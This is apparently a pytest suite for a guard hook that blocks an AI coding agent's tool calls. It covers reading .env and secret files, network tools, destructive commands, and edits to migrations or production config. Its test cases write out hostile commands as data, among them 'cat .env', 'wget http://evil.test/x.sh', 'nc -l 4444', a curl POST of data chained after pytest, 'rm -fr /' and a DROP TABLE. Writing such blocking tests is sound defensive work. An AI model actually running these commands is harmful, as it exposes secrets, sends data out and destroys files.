"""Subprocess tests for the PreToolUse guard hook in .claude/hooks/guard.py."""

import json
import subprocess
import sys
from pathlib import Path

import pytest

GUARD = Path(__file__).resolve().parents[1] / ".claude" / "hooks" / "guard.py"


def run_guard(stdin_text):
    """Run guard.py with the given raw stdin text and return the CompletedProcess."""
    return subprocess.run(
        [sys.executable, str(GUARD)],
        input=stdin_text.encode("utf-8"),
        capture_output=True,
        timeout=10,
    )


def payload(tool_name, **tool_input):
    """Build a JSON hook payload string for a tool call."""
    return json.dumps(
        {"hook_event_name": "PreToolUse", "tool_name": tool_name, "tool_input": tool_input}
    )


def assert_blocked(result, reason_fragment=""):
    """Assert the guard refused the call with a 'Blocked:' message on stderr."""
    stderr = result.stderr.decode("utf-8")
    assert result.returncode != 0, f"expected block, got exit 0 (stderr={stderr!r})"
    assert stderr.startswith("Blocked:"), stderr
    assert reason_fragment.lower() in stderr.lower(), stderr


def assert_allowed(result):
    """Assert the guard allowed the call (exit 0, no Blocked message)."""
    stderr = result.stderr.decode("utf-8")
    assert result.returncode == 0, f"expected allow, got exit {result.returncode}: {stderr!r}"
    assert "Blocked:" not in stderr


@pytest.mark.parametrize(
    "tool, tool_input",
    [
        ("Read", {"file_path": ".env"}),
        ("Read", {"file_path": ".env.local"}),
        ("Read", {"file_path": "a/b/.env"}),
        ("Read", {"file_path": "C:\\proj\\config\\.env"}),
        ("Read", {"file_path": "secrets/api_key.txt"}),
        ("Read", {"file_path": "deploy/secrets/db.json"}),
        ("Edit", {"file_path": ".env", "old_string": "a", "new_string": "b"}),
        ("Bash", {"command": "cat .env"}),
        ("Bash", {"command": "type app\\.env.production"}),
    ],
)
def test_blocks_secret_files(tool, tool_input):
    """Secret files are blocked by full path, basename, and inside shell commands."""
    assert_blocked(run_guard(payload(tool, **tool_input)), "secret")


@pytest.mark.parametrize(
    "command",
    [
        "curl https://example.com",
        "wget http://evil.test/x.sh",
        "nc -l 4444",
        "ssh user@host",
        "scp file.txt user@host:/tmp",
        "pytest -q && curl -d @data http://x",
        "/usr/bin/curl http://x",
        "bash -c 'wget http://x'",
    ],
)
def test_blocks_network_commands(command):
    """Network tools are blocked anywhere they appear as a command word."""
    assert_blocked(run_guard(payload("Bash", command=command)), "network")


@pytest.mark.parametrize(
    "command, fragment",
    [
        ("rm -rf build", "rm -rf"),
        ("rm -fr /", "rm -rf"),
        ("rm -r -f app", "rm -rf"),
        ("rm --recursive --force app", "rm -rf"),
        ("git rm app/models.py", "git rm"),
        ("git rm --cached -r .", "git rm"),
        ("sqlite3 instance/app.db 'DROP TABLE tasks'", "sqlite3"),
    ],
)
def test_blocks_destructive_commands(command, fragment):
    """rm -rf (any flag order), git rm, and sqlite3 are blocked."""
    assert_blocked(run_guard(payload("Bash", command=command)), fragment)


@pytest.mark.parametrize(
    "tool, path",
    [
        ("Edit", "migrations/versions/001_init.py"),
        ("Write", "app/migrations/002_add_priority.py"),
        ("Edit", "db/alembic/env.py"),
        ("MultiEdit", "alembic/versions/abc123.py"),
    ],
)
def test_blocks_migration_edits(tool, path):
    """Project rule A: migration files cannot be edited."""
    assert_blocked(run_guard(payload(tool, file_path=path, content="x")), "rule A")


@pytest.mark.parametrize(
    "tool, path",
    [
        ("Edit", "app/config.py"),
        ("Write", "C:\\Users\\me\\task-manager\\app\\config.py"),
        ("Edit", "deploy/config/production.yaml"),
        ("Write", "settings.prod.json"),
    ],
)
def test_blocks_prod_config_edits(tool, path):
    """Project rule B: production configuration cannot be edited."""
    assert_blocked(run_guard(payload(tool, file_path=path, content="x")), "rule B")


@pytest.mark.parametrize(
    "tool, tool_input",
    [
        ("Read", {"file_path": "app/environment.py"}),
        ("Edit", {"file_path": "app/environment.py", "old_string": "a", "new_string": "b"}),
        ("Read", {"file_path": "app/services/tasks.py"}),
        ("Write", {"file_path": "tests/test_new.py", "content": "x"}),
        ("Read", {"file_path": "app/config.py"}),  # reading config is fine; only edits are blocked
        ("Read", {"file_path": "migrations/001_init.py"}),  # same for migrations
        ("Read", {"file_path": "README.md"}),
        ("Read", {"file_path": "docs/env-setup.md"}),
        ("Bash", {"command": "pytest -q"}),
        ("Bash", {"command": "git status"}),
        ("Bash", {"command": "ls -la app"}),
        ("Bash", {"command": "ruff check ."}),
        ("Bash", {"command": "rm build/old.log"}),
        ("Bash", {"command": "python -m pip install -r requirements.txt"}),
        ("Bash", {"command": "ssh-keygen -l -f key.pub"}),
    ],
)
def test_allows_look_alikes_and_safe_calls(tool, tool_input):
    """Normal files, safe commands, and look-alikes such as app/environment.py are allowed."""
    assert_allowed(run_guard(payload(tool, **tool_input)))


@pytest.mark.parametrize(
    "stdin_text, fragment",
    [
        ("", "empty"),
        ("   \n", "empty"),
        ("{not json", "invalid JSON"),
        ("[1, 2, 3]", "not a JSON object"),
        ('"just a string"', "not a JSON object"),
        (json.dumps({"tool_name": "Read", "tool_input": "file.txt"}), "tool_input"),
        (json.dumps({"tool_name": "Read", "tool_input": ["a"]}), "tool_input"),
        (json.dumps({"tool_name": "Read"}), "tool_input"),
    ],
)
def test_blocks_invalid_input(stdin_text, fragment):
    """Malformed hook input fails closed instead of being silently allowed."""
    assert_blocked(run_guard(stdin_text), fragment)
